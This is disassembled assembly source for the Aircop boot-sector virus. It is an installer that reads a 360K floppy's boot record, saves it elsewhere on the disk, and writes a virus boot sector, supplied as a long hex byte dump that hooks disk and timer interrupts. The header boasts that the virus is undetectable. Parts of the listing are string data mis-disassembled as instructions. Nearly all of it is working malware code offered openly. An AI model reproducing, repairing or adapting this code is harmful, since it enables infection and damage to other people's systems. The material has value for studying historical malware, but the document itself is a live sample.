ีออออออออออออออออออออออออออออออออออออออออออออออออออออธ
ณ Aircop Virus (c)RABiD Source Code                  ณ
ณ Ripped by : The Head Hunter [FS]                  ณ
ณ                                                    ณ
ณ Seem's this baby only work on Bare 360k Drive      ณ
ณ System. Neat Anywayz. And it's Undetectable!       ณ
ณ                                                    ณ
ณ                                                    ณ
ิออออออออออออออออออออออออออออออออออออออออออออออออออออพ
  MOV    AX, CS
  MOV    DS, AX
  MOV    SP, 03b6h
  MOV    AH, 00h
  MOV    AL, 03h
  INT    10h        ;Set video mode
  MOV    DX, 052bh
  MOV    AH, 09h
  INT    21h        ;"AIRCOP Test Version"
  MOV    DX, 03c3h
  MOV    AH, 09h
  INT    21h        ;"

  MOV    DX, 04e5h
  MOV    AH, 09h
  INT    21h        ;"Aircop Virus$Cannot"
  MOV    DX, 0464h
  MOV    AH, 09h
  INT    21h        ;"" into your 360K di"
  MOV    DX, 0480h
  MOV    AH, 09h
  INT    21h        ;"Put a 360K (Blank F"
  MOV    AX, 0040h
  MOV    ES, AX

  PUSH   WORD PTR ES:[Data5]

  POP    WORD PTR ES:[Data6]
  MOV    AX, CS
  MOV    ES, AX
  MOV    AH, 08h
  INT    21h        ;Get char w/o echo
  MOV    CX, 0003h
  PUSH   CX
  MOV    AX, 0201h
  MOV    BX, 05d0h
  MOV    CX, 0001h
  MOV    DX, 0000h
  INT    13h        ;Read disk sectors
  POP    CX
  JNB    Jmp0
  LOOP   Data7
  MOV    DX, 04f2h
  MOV    AH, 09h
  INT    21h        ;"Cannot read boot re"
  MOV    AX, 4cffh
  INT    21h        ;Exit

  XOR    WORD PTR CS:[BP+Data17], 7420h
  PUSH   CX
  MOV    AX, 0301h
  MOV    BX, 05d0h
  MOV    CX, 2709h
  MOV    DX, 0100h
  INT    13h        ;Write disk sectors
  POP    CX
  JNB    Jmp4
  LOOP   Data18
  MOV    DX, 050eh
  MOV    AH, 09h
  INT    21h        ;"Cannot write boot r"
  MOV    AX, 4cffh
  INT    21h        ;Exit

  MOV    CX, 0003h
  PUSH   CX
  MOV    AX, 0301h
  MOV    BX, 07d0h
  MOV    CX, 0001h
  MOV    DX, 0000h
  INT    13h        ;Write disk sectors
  POP    CX
  JNB    Jmp5
  LOOP   Data20
  MOV    DX, 057ch
  MOV    AH, 09h
  INT    21h        ;"Cannot write virus "
  MOV    AX, 4cffh
  INT    21h        ;Exit

  MOV    DX, 04e5h
  MOV    AH, 09h
  INT    21h        ;"Aircop Virus$Cannot"
  MOV    DX, 059eh
  MOV    AH, 09h
  INT    21h        ;" was installed into"
  MOV    AX, 4c00h
  INT    21h        ;Exit
  db     'STACK   STACK   STAC'
  db     'K   STACK   STACK   '
  db     'STACK   STACK   STAC'
  db     'K   STACK   STACK   '
  db     'STACK   STACK   STAC'
  db     'K   STACK   STACK   '
  db     'STACK   STACK  '
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [BP+DI+Data9], DL
  INC    CX
  INC    BX
  DEC    BX
  AND    BYTE PTR [BX+SI], AH
  AND    BYTE PTR [DI], CL

  OR     AL, BYTE PTR [BX+DI+Data11]
  JZ     Jmp1
  OUTSB
  JZ     Jmp2
  OUTSW
  OUTSB
  CMP    AH, BYTE PTR [BX+SI]
  PUSH   SP
  PUSH   BYTE PTR [BX+DI+Data12], 7620h
  db     'irus sample uses onl'
  db     'y in research teams.'
  db     0d,0a
  db     '           Please do'
  db     ' not use in joking o'
  db     'r setting tra'

  XOR    WORD PTR CS:[BX+SI], 6e69h

  XOR    WORD PTR CS:[BP+SI+Data13], 2073h
  OUTSW
  OUTSB
  AND    BYTE PTR [BP+DI+Data14], DH
  INSW
  db     'eone.'
  db     0d,0a,0d,0a
  db     'Warning! This file i'

  XOR    WORD PTR CS:[BX+Data15], 2e65h
  db     'nstalls "$" into you'

  db     'r 360K disk!'
  db     0d,0a,0d,0a,07
  db     '$Put a 360K (Blank F'

  db     'ormatted) disk into '
  db     'drive A:'
  db     0d,0a
  db     'Strike any key to in'
  db     'stall, or CTRL-BREAK'
  db     ' to quit.'
  db     0d,0a
  db     '$Aircop Virus$Cannot'


  db     ' read boot record.'
  db     0d,0a,07
  db     '$Cannot write boot r'

  db     'ecord.'
  db     0d,0a,07
  db     '$AIRCOP Test Version'

  db     ': Property of The RA'
  db     'BID Nat'nl Developme'
  db     'nt Corp. '91'
  db     0d,0a,20,24,0d,0a,0d,0a,0d,0a

  db     'Cannot write virus b'
  db     'oot record'
  db     0d,0a,07
  db     '$ was installed into'

  db     ' this 360K disk. BE '
  db     'CAREFUL!'
  db     0d,0a,24,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,eb,34,90,49,42
  db     'M  3.3'
  db     00,02,02,01,00,02,70,00,d0,02,fd,02,00,09,00,02,00,00,00,00
  db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,12,00,00,00
  db     00,01,00,fa,33,c0,8e,d8,8e,d0,bb,00,7c,8b,e3,1e,53,ff,0e,13
  db     04,cd,12,b1,06,d3,e0,8e,c0,87,06,4e,00,a3,ab,7d,b8,28,01,87
  db     06,4c,00,a3,a9,7d,8c,c0,87,06,66,00,a3,af,7d,b8,bb,00,87,06
  db     64,00,a3,ad,7d,33,ff,8b,f3,b9,00,01,fc,f3,a5,fb,06,b8,85,00
  db     50,cb,53,32,d2,e8,70,00,5b,1e,07,b4,02,b6,01,e8,8a,00,72,10
  db     0e,1f,be,0b,00,bf,0b,7c,b9,2b,00,fc,f3,a6,74,07,5b,58,0e,b8
  db     af,00,50,cb,0e,1f,be,db,01,e8,23,00,32,e4,cd,16,33,c0,cd,13
  db     0e,07,bb,0d,02,b9,06,00,33,d2,b8,01,02,cd,13,72,df,b9,f0,0f
  db     8e,d9,2e,ff,2e,ad,01,bb,07,00,fc,ac,0a,c0,74,44,79,05,34,d7
  db     80,cb,88,3c,20,76,07,b9,01,00,b4,09,cd,10,b4,0e,cd,10,eb,df
  db     bb,00,02,b9,02,00,8a,e1,e8,17,00,b9,09,27,26,80,37,fd,74,03
  db     b9,0f,4f,eb,13,90,b4,02,bb,00,02,b9,01,00,b6,00,b0,01,9c,2e
  db     ff,1e,a9,01,c3,50,53,51,52,06,1e,56,57,9c,0e,1f,80,fa,01,77
  db     54,25,00,fe,74,4f,86,c5,d0,e0,02,c6,b4,09,f6,e4,03,c1,2c,06
  db     3d,06,00,77,3c,0e,07,e8,c0,ff,72,30,bf,43,00,be,50,02,b9,0e
  db     00,fd,f3,a6,74,27,2b,f1,2b,f9,b1,33,f3,a4,e8,8b,ff,51,53,e8
  db     a0,ff,b4,03,33,db,e8,9e,ff,5b,59,72,07,b6,01,b4,03,e8,98,ff
  db     33,c0,e8,95,ff,b4,04,cd,1a,80,fe,09,75,06,be,b1,01,e8,3f,ff
  db     9d,5f,5e,1f,07
  db     'ZY[X.'
  db     ff,2e,a9,01,59,ec,02,c6,f2,e6,00,f0,da,dd,20,83,bf,be,a4,f7
  db     be,a4,f7,96,be,a5,b4,b8,a7,da,dd,00
  db     'IO      SYSMSDOS   S'
  db     59,53,0d,0a
  db     'Non-system disk or d'
  db     'isk error'
  db     0d,0a,00,00,55,aa






